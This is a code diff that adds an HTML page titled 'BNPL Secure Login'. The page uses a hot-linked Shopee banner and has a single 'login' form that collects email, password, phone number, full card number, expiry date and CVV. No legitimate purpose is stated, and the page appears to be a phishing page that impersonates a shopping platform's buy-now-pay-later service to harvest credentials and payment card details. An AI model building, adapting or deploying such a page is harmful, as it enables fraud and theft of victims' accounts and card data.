@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<title>BNPL Secure Login</title>
+	<style type="text/css">body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+        }
+        .banner {
+            width: 100%;
+            display: block;
+            margin: 0 auto 20px auto;
+            object-fit: cover;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .container h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .btn {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .btn:hover {
+            background-color: #45a049;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #777;
+        }
+	</style>
+</head>
+<body>
+<p><img alt="Shopee Banner" class="banner" src="https://cf.shopee.com.my/file/my-11134258-7rase-m4ifpj0099tl8d_xxhdpi" /></p>
+
+<div class="container">
+<h2>Secure BNPL Account Login</h2>
+
+<form action="" method="POST">
+<div class="form-group"><label for="email">Email Address</label> <input id="email" name="email" placeholder="Enter your email" required="" type="email" /></div>
+
+<div class="form-group"><label for="password">Password</label> <input id="password" name="password" placeholder="Enter your password" required="" type="password" /></div>
+
+<div class="form-group"><label for="phone">Phone Number</label> <input id="phone" name="phone" placeholder="Enter your phone number" required="" type="tel" /></div>
+
+<div class="form-group"><label for="card">Card Number</label> <input id="card" name="card" pattern="\d{16}" placeholder="Enter your card number" required="" title="Card number must be 16 digits" type="text" /></div>
+
+<div class="form-group"><label for="expiry">Expiry Date (MM/YY)</label> <input id="expiry" name="expiry" pattern="\d{2}/\d{2}" placeholder="MM/YY" required="" title="Expiry date format should be MM/YY" type="text" /></div>
+
+<div class="form-group"><label for="cvv">CVV</label> <input id="cvv" name="cvv" pattern="\d{3}" placeholder="Enter CVV" required="" title="CVV must be 3 digits" type="text" /></div>
+<button class="btn" type="submit">Login</button></form>
+
+<div class="footer">&copy; 2024 BNPL Secure Portal. All rights reserved.</div>
+</div>
+</body>
+</html>
